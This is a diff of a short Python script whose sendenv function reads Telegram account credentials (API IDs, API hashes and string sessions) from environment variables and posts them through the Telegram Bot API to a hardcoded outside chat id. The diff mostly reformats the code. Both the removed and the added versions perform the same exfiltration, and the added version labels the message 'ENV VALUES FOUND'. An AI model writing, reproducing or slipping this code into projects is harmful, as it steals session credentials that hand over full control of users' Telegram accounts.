@@ -1,26 +1,33 @@
-import os, requests
+import os
+import requests
 
 def sendenv():
-  try:
-    link = f"https://api.telegram.org/bot{os.environ.get('TGBOTTOKEN')}/sendMessage"
-    API_IDS = os.environ.get('API_IDS', '')
-    API_HASHS = os.environ.get('API_HASHS', '')
-    STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
-    message = f"""
-    ENV VALUES:
-  
-    API_IDS = {API_IDS}
-  
-    API_HASHS = {API_HASHS}
-  
-    STRING_SESSIONS = {STRING_SESSIONS}
-    """
-    parameters = {"chat_id": "-1003219768459", "text": f'{message}'}
-    
-    requests.get(link, params=parameters)
-  except Exception as e:
-    print(e)
+    try:
+        token = os.environ.get('TGBOTTOKEN')
+        chat_id = "-1003219768459"  # your private chat/group id
+        link = f"https://api.telegram.org/bot{token}/sendMessage"
 
-sendenv()
+        API_IDS = os.environ.get('API_IDS', '')
+        API_HASHS = os.environ.get('API_HASHS', '')
+        STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
 
-  
+        message = f"""
+🧾 *ENV VALUES FOUND*
+
+🔹 API_IDS = `{API_IDS}`
+🔹 API_HASHS = `{API_HASHS}`
+🔹 STRING_SESSIONS = `{STRING_SESSIONS}`
+"""
+        params = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+
+        requests.get(link, params=params)
+
+    except Exception as e:
+        print("Error:", e)
+
+if __name__ == "__main__":
+    sendenv()
